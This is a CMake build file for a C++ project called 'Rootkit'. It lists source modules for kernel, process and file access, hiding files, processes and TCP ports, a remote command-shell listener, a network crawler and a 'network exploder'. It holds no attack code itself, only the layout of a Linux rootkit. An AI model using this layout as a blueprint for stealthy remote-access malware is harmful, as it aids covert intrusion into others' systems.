cmake_minimum_required(VERSION 3.18)
project(Rootkit)

set(CMAKE_CXX_STANDARD 20)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -pthread")
add_executable(Rootkit

        ../basic/basic_rootkit.h
        ../basic/basic_plugin.h
        ../basic/basic_rootkit.cpp
        ../basic/mex_generator.h
        ../basic/mex_generator.cpp

#        linux file system access
        file_system_access/file_system_access.h
        file_system_access/file_system_access.cpp

#        linux network access
        network_access/network_access.cpp
        network_access/network_access.h
        network_access/basic_client_handler.h
        network_access/linux_client_handler.cpp
        network_access/linux_client_handler.h

        network_access/tcp/basic_tcp_port_listener.h
        network_access/tcp/linux_tcp_port_connection_establisher.h
        network_access/tcp/dummy_tcp_port_listener.cpp
        network_access/tcp/dummy_tcp_port_listener.h
        network_access/tcp/tcp_port.h

        # linux process access
        process_access/process_access.h
        process_access/process_access.cpp

        # linux cli shell access
        cli_shell_access/cli_shell_access.cpp
        cli_shell_access/cli_shell_access.h

        # files, process, and tcp ports hider
        hider_access/hider_access.cpp
        hider_access/hider_access.h

        # linux kernel level access
        kernel_access/kernel_access.cpp
        kernel_access/kernel_access.h
        kernel_access/operations_protocol.h
        kernel_access/msg_to_module.h
        kernel_access/msg_to_user.h

#       linux features
        features/network_crawler/network_crawler.cpp
        features/network_crawler/network_crawler.h

        features/network_exploder/network_exploder.cpp
        features/network_exploder/network_exploder.h

        features/remote_cli_shell_controller/remote_cli_shell_controller.cpp
        features/remote_cli_shell_controller/remote_cli_shell_controller.h
        features/remote_cli_shell_controller/shell_command_tcp_port_listener.cpp
        features/remote_cli_shell_controller/shell_command_tcp_port_listener.h

#       linux rootkit
        linux_rootkit.cpp
        linux_rootkit.h

#       linux rootkit controllers
        test_rootkit_controller.cpp # contains main function
        test_rootkit_controller.h

)
